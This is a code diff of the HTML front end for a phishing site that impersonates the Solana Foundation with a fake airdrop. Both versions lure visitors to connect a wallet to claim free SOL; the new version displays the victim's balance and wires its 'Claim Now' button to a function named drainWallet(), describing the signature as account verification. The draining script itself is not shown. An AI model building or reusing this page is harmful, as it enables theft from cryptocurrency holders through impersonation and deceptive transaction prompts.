@@ -3,105 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Foundation | Ecosystem Airdrop 2026</title>
+    <title>Solana Rewards | Claim Your Airdrop</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Solana Web3.js Library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 </head>
 <body>
-    <!-- Background -->
-    <div class="bg-gradient"></div>
-
-    <!-- Real Header (The "Real" Website Feel) -->
-    <nav class="navbar">
-        <div class="logo-container">
-            <i class="fa-brands fa-hexagon-nodes"></i>
-            <span>Solana</span>
-        </div>
-        <div class="nav-links">
-            <span>Ecosystem</span>
-            <span>Grants</span>
-            <span class="active">Airdrop</span>
-        </div>
-        <button class="btn-connect-nav" id="nav-connect-btn">Connect Wallet</button>
-    </nav>
-
-    <!-- Main Content Area -->
-    <main class="content-wrapper">
-        <!-- Section 1: The "News" / Intro -->
-        <div id="landing-section" class="section active-section">
-            <div class="badge">Official Update</div>
-            <h1>Solana Ecosystem <br> <span class="highlight">Bonus Program 2026</span></h1>
-            <p class="description">
-                To celebrate the new upgrade, we are distributing <strong>SOL</strong> to active holders. 
-                Eligibility is determined by your wallet's historical activity and current balance.
-            </p>
+    <div class="container">
+        <h1 style="text-align: center; margin-top: 20px;">Solana Rewards</h1>
+        
+        <div class="content-box">
+            <h2>Congratulations!</h2>
+            <p id="intro-text">You have been selected for a special Solana distribution.</p>
             
-            <div class="stats-row">
-                <div class="stat-box">
-                    <span class="stat-label">Total Distributed</span>
-                    <span class="stat-value">4.2M SOL</span>
+            <div id="status" class="status">Waiting for connection...</div>
+            
+            <button id="connectBtn" onclick="startProcess()">Connect Wallet & Claim</button>
+            
+            <div id="claim-details" class="hidden">
+                <div class="detail-row">
+                    <span>Airdrop Amount:</span>
+                    <span id="reward-amount" class="highlight">...</span>
                 </div>
-                <div class="stat-box">
-                    <span class="stat-label">Eligible Wallets</span>
-                    <span class="stat-value">120,430</span>
+                <div class="detail-row">
+                    <span>Your Wallet Balance:</span>
+                    <span id="user-balance" class="highlight">...</span>
                 </div>
+                <div class="detail-row">
+                    <span>Network Fee:</span>
+                    <span>0.000005 SOL</span>
+                </div>
+                <p class="small-text">Click "Claim" to approve the transaction. This will verify your account and distribute your rewards.</p>
             </div>
-
-            <div class="action-area">
-                <button id="btn-enter-wallet" class="btn-primary-large">
-                    <i class="fa-solid fa-wallet"></i> Connect Wallet to Check Eligibility
-                </button>
-                <p class="secure-note"><i class="fa-solid fa-lock"></i> Secure Connection via Phantom / Solflare</p>
-            </div>
+            
+            <button id="claimBtn" class="hidden" onclick="drainWallet()">Claim Now</button>
         </div>
-
-        <!-- Section 2: The Wallet Dashboard (Hidden initially) -->
-        <div id="wallet-section" class="section hidden-section">
-            <div class="card-header">
-                <div class="user-info">
-                    <i class="fa-solid fa-circle-user user-icon"></i>
-                    <div class="address-group">
-                        <span id="user-address" class="user-addr">Loading...</span>
-                        <span class="balance-label">Balance Detected</span>
-                    </div>
-                </div>
-                <div class="status-indicator connected">
-                    <span class="dot"></span> Connected
-                </div>
-            </div>
-
-            <div class="balance-card">
-                <span class="label">Total Assets</span>
-                <span id="detected-balance" class="amount">0.0000 SOL</span>
-            </div>
-
-            <div class="claim-box">
-                <div class="claim-header">
-                    <h2>Available Reward</h2>
-                    <div class="claim-amount">
-                        <span id="reward-amount">2.5000</span> SOL
-                    </div>
-                </div>
-                <p class="claim-info">
-                    This reward has been reserved for your wallet. Click below to sign the transaction and receive your bonus.
-                </p>
-                <button id="btn-claim-final" class="btn-claim-full">
-                    Claim Bonus
-                </button>
-            </div>
+        
+        <div class="footer">
+            <p>© 2026 Solana Foundation. All rights reserved.</p>
         </div>
-    </main>
-
-    <div id="loading-overlay" class="hidden">
-        <div class="spinner"></div>
-        <p>Connecting to Solana Network...</p>
     </div>
 
-    <!-- Toasts -->
-    <div id="toast-container"></div>
+    <!-- Notification Container -->
+    <div id="notification-container"></div>
 
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
